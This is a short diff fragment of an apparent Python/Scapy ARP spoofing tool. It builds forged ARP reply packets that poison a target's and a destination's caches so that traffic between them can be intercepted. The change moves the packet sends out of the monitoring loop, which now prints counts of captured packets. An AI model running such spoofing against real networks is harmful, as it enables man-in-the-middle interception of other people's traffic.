@@ -109,11 +109,12 @@ pkt1 = Ether(src=D_SRC_MAC, dst=DST_MAC) /\
 pkt2 = Ether(src=T_SRC_MAC, dst=TRG_MAC) /\
         ARP(op=2, hwsrc=T_SRC_MAC, psrc=DST_IP, hwdst=TRG_MAC, pdst=TRG_IP)
 
+sendp(pkt1)
+sendp(pkt2)
+
 
 try:
     while True:
-        sendp(pkt1)
-        sendp(pkt2)
         print(f"Total {pkts_count} | {pkts_from_trg} from {TRG_IP} | {pkts_from_dst} from {DST_IP}", end='\r')
         sleep(0.5)
 except KeyboardInterrupt:
